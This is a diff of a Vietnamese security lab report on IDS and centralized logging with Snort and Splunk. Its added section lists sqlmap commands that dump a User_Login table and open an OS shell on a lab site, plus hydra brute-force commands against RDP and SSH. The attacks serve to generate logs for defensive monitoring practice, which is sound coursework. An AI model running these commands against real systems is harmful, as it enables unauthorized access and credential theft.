@@ -72,6 +72,8 @@ Sau khi tấn công thành công vào path sau check log:  C:\inetpub\logs\logFi
 
 ![alt text](lab4_6.png)
 
+![alt text](lab4_20.png)
+
 ### Task 3: Local Logging: Cấu hình, Giám sát và Phân tích IDS Logs 
 
 Kiểm tra danh sách card mạng bằng lệnh: `snort -W`
@@ -110,3 +112,56 @@ Kết quả: TCP và FIN scan
 Kết quả: XMAS
 
 ![alt text](lab4_13.png)
+
+
+#### Task 4: Centralized Logging: Thu thập log tập trung với Splunk
+Sau khi cài đặt xong Splunk và cấu hình file config 
+
+Thử tấn công SQL Injection, Brute Force Attacks và Nmap
+
+Lệnh sqlmap: 
+
+`sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=7" --cookie="mscope=jJH/XtdJK24=; ui-tabs-1=0" --dbs`
+
+`sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=7" --cookie="mscope=jJH/XtdJK24=; ui-tabs-1=0"  -D moviescope --tables`
+
+`sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=7" --cookie="mscope=jJH/XtdJK24=; ui-tabs-1=0" -D moviescope -T User_Login --dump "mscope=jJH/XtdJK24=; ui-tabs-1=0"`
+
+`sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=7" --cookie="mscope=jJH/XtdJK24=; ui-tabs-1=0" --os-shell`
+
+Lệnh brute force:
+
+`hydra -t 1 -V -f -l Jason -P /usr/share/wordlists/rockyou.txt rdp://192.168.70.194`
+
+`hydra -l thuong -P /usr/share/wordlists/rockyou.txt 192.168.108.100 ssh -V -t 4`
+
+Lệnh nmap thì tương tự trên
+
+Sau khi tấn công xong tất cả các log liên quan đến Win2022 được ghi nhận trong Splunk tại `Search console` nhấp vào 
+`Data Summary` trong phần `How to Search` sẽ hiển thị như trong ảnh chụp màn hình dưới
+
+#### Xem các Event Code log
+
+![alt text](lab4_14.png)
+
+![alt text](lab4_15.png)
+
+![alt text](lab4_16.png)
+
+![alt text](lab4_17.png)
+
+![alt text](lab4_18.png)
+
+#### Xem các log liên quan đến IIS
+Nhấn vào  IIS logs --> chọn sourcetype từ 
+
+![alt text](lab4_19.png)
+
+
+####  Log liên quan khác
+
+![alt text](lab4_21.png)
+
+![alt text](lab4_22.png)
+
+Và còn nhiều loại log hơn nữa, ....
